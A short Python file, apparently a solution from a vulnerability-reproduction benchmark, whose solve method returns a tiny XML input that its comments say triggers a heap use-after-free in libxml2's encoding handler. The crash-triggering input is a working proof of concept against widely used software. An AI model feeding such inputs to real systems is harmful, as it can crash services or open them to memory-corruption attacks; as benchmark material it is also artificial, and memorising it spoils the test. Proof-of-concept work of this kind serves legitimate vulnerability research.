import os
import subprocess
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC triggers a heap use-after-free in libxml2's encoding handler
        # The vulnerability is in xmlAllocOutputBufferInternal when creating output buffers
        # A minimal 24-byte XML with encoding declaration triggers the issue
        return b'<?xml encoding="U"?><a/>\n'